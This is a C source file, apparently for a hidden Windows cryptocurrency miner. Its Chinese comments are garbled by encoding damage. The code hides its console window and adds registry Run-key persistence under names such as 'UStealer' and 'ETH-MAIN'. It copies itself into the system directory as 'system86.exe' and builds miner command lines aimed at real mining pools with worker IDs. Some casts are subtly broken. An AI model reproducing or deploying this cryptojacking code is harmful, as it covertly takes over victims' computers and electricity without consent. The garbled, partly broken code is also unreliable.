#include "COIN.h"


//const char* ETH = "";
//const char* ETC = "nircmd elevatecmd exec hide " % AppData % \Microsoft\Windows\start_miner.bat"";

char start;
char message[1000];	
char ANG[1000];
const char* cionname = "zhulele03.PC002";
const char* ssl = "stratum+tcp://es.huobipool.com:1800\
";

const char* ETC = "miner.exe --algo etchash  --server etc-pool.beepool.org:9518 --user zhuxs.PC01";
const char* CP = "notepad.exe";




void guanbi() {
	HWND hwndDOS = GetForegroundWindow();
	ShowWindow(hwndDOS, SW_HIDE);
}


void HKRunator(char* programName)   //�������ƣ�**ȫ·��**��
{
	HKEY hkey = NULL;
	DWORD rc;

	rc = RegCreateKeyEx(HKEY_LOCAL_MACHINE,                      //����һ��ע�����������򿪸�ע�����
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_WOW64_64KEY | KEY_ALL_ACCESS,    //����windowsϵͳ������лᱨ�� ɾ�� ����KEY_WOW64_64KEY | ���� ����
		NULL,
		&hkey,
		NULL);

	if (rc == ERROR_SUCCESS)
	{
		rc = RegSetValueEx(hkey,
			"UStealer",
			0,
			REG_SZ,
			(const BYTE*)programName,
			strlen(programName));
		if (rc == ERROR_SUCCESS)
		{
			RegCloseKey(hkey);
		}
	}
}


void windows_run() {
	//д��ע���,���������� 
	HKEY hKey;
	//�ҵ�ϵͳ�������� 
	LPCTSTR lpRun = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	//��������Key 
	long lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpRun, 0, KEY_WRITE, &hKey);
	if (lRet == ERROR_SUCCESS)
	{
		char pFileName[MAX_PATH] = { 0 };
		//�õ����������ȫ·�� 
		DWORD dwRet = GetModuleFileName(NULL, pFileName, MAX_PATH);
		//���һ����Key,������ֵ // �����"getip"��Ӧ�ó������֣����Ӻ�׺.exe��
		lRet = RegSetValueEx(hKey, "ETH-MAIN", 0, REG_SZ, (BYTE*)pFileName, dwRet);

		//�ر�ע��� 
		RegCloseKey(hKey);
		if (lRet != ERROR_SUCCESS)
		{
			//AfxMessageBox("");
			MessageBoxA(0, "ϵͳ��������,������ϵͳ����", "ϵͳ", 0);
		}
	}
}


void windows_text() {
	{
		wchar_t system[MAX_PATH]; //ϵͳĿ¼·��
		wchar_t pathtofile[MAX_PATH]; //Ҫ�������е��ļ�������·��
		HMODULE GetModH = GetModuleHandle(NULL);

		//�õ���ǰִ���ļ���ȫ·��
		GetModuleFileName(GetModH, pathtofile, sizeof(pathtofile));

		//�õ�ϵͳ�ļ�����Ŀ¼��·������c:\windows\system32
		GetSystemDirectory((wchar_t)system, sizeof(system));

		//�γ�Ҫ���Ƶ���ȫ·������c:\windows\system32\yourvirus.exe
		char* system2 = (char*)system;

		strcat(system2, "\\system86.exe");

		//���Ҹ��Ƶ�Ŀ��·��
		CopyFile(pathtofile, system, false);

		//д��ע����Ա㿪���Զ�����
		HKEY hKey;

		//��ע���:·������
		//HEKY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
		char* path1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
		LPCWSTR path2 = (LPCWSTR)path1;
		RegOpenKeyEx(HKEY_LOCAL_MACHINE, path2, 0, KEY_SET_VALUE, &hKey);

		//����һ��ֵ,������������,ֵΪҪ�������е��ļ�������·��
		char* path3 = "ETH-MAIN";
		LPCWSTR path4 = (LPCWSTR)path3;

		RegSetValueEx(hKey, path4, 0, REG_SZ, (const unsigned char*)system, sizeof(system));

		//�ر�ע���:
		RegCloseKey(hKey);

		/*���Լ�����������*/

	}
}






void ETH(const char* ssl, const char* coinname) {
	char text10[] = "PhoenixMiner.exe -pool %s -wal %s -dagrestart 1 -rvram -1 -eres 0";
	memset(message, 0, sizeof(text10));
	sprintf(message, text10, ssl, coinname);
	//cout << start << message << endl;
}



//void ETHS()
//{
//	char ETHT[] = "nircmd elevatecmd exec hide\" % AppData % \Microsoft\Windows\start_miner.bat\"";
//	
//}


void setcolor(unsigned short color)
{
	HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hcon, color);
}












